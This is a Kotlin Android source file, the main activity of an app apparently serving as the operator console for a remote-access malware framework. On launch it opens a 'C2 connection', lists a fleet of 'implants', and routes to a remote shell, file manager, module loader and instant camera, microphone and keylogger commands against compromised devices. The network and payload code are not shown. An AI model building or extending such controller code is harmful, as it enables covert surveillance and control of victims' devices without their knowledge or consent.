package com.shadow.operator

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.shadow.operator.data.*
import com.shadow.operator.ui.fleet.FleetScreen
import com.shadow.operator.ui.client.ClientControlScreen
import com.shadow.operator.ui.terminal.TerminalScreen
import com.shadow.operator.ui.filemanager.FileManagerScreen
import com.shadow.operator.ui.modules.ModuleManagerScreen
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private lateinit var database: AppDatabase
    private lateinit var configManager: ConfigManager
    private lateinit var repository: Repository
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        database = AppDatabase.getInstance(applicationContext)
        configManager = ConfigManager(applicationContext)
        
        repository = Repository(
            dao = database.implantDao(),
            historyDao = database.commandHistoryDao(),
            moduleDao = database.moduleRegistryDao(),
            mediaDao = database.mediaRecordingDao(),
            configManager = configManager,
            scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        )

        // Start C2 connection
        scope.launch {
            val config = configManager.getConfig()
            repository.initializeNetwork(config)
        }

        setContent {
            MaterialTheme(colorScheme = androidx.compose.material3.darkColorScheme()) {
                Surface(modifier = Modifier.fillMaxSize()) {
                    ShadowApp(repository)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        repository.shutdown()
    }
}

@Composable
fun ShadowApp(repository: Repository) {
    val navController = rememberNavController()
    val implants by repository.allImplants.collectAsState()
    val connectionState by repository.connectionState.collectAsState()

    NavHost(navController = navController, startDestination = "fleet") {
        composable("fleet") {
            FleetScreen(
                implants = implants,
                connectionState = connectionState.name,
                onImplantSelect = { navController.navigate("client/${it.implantId}") },
                onAddImplantClick = { /* Open setup wizard */ }
            )
        }
        
        composable("client/{id}") { backStackEntry ->
            val id = backStackEntry.arguments?.getString("id") ?: return@composable
            val implant = implants.find { it.implantId == id } ?: return@composable
            
            ClientControlScreen(
                implant = implant,
                onNavigateBack = { navController.popBackStack() },
                onActionSelected = { action ->
                    when (action) {
                        "SHELL" -> navController.navigate("terminal/$id")
                        "FILE_MANAGER" -> navController.navigate("fs/$id")
                        "MODULES" -> navController.navigate("modules/$id")
                        else -> {
                            // Instant actions (Cam, Mic, Keylog)
                            repository.sendCommand(id, com.shadow.operator.data.Command.CommandType.valueOf(action), "{}")
                        }
                    }
                }
            )
        }

        composable("terminal/{id}") { backStackEntry ->
            TerminalScreen(
                implantId = backStackEntry.arguments?.getString("id")!!,
                repository = repository,
                onNavigateBack = { navController.popBackStack() }
            )
        }

        composable("fs/{id}") { backStackEntry ->
            FileManagerScreen(
                implantId = backStackEntry.arguments?.getString("id")!!,
                repository = repository,
                onNavigateBack = { navController.popBackStack() }
            )
        }

        composable("modules/{id}") { backStackEntry ->
            ModuleManagerScreen(
                implantId = backStackEntry.arguments?.getString("id")!!,
                repository = repository,
                onNavigateBack = { navController.popBackStack() }
            )
        }
    }
}